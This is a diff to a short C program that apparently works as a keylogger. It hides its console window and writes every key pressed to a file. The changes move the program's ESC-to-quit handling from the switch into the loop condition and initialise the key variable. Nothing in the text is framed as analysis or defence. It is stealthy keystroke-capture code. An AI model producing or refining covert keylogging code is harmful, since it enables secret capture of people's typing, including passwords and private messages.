@@ -13,19 +13,18 @@ void logToFile(char *key)                      //function receives pointer to ch
     switch(*key)                               //decides what to make with received char
     {
         case 13: fprintf(f, "\n"); break;      //Breaks line on ENTER
-        case 27: exit(0);                      //Exits program on ESC
         default: fprintf(f, "%c", *key);       //writes to file on deafult
     }
 }
 
 int main()                                     //start point
 {
-    char key;                                  //char to be read
+    char key = 0;                              //char to be read
 
     HWND console = GetConsoleWindow();         //gets console handle
     ShowWindow(console, SW_HIDE);              //hides console
 
-    while(1)                                   //infinite loop
+    while(key != 27)                           //infinite loop
     {
         if(kbhit())                            //on key press
         {
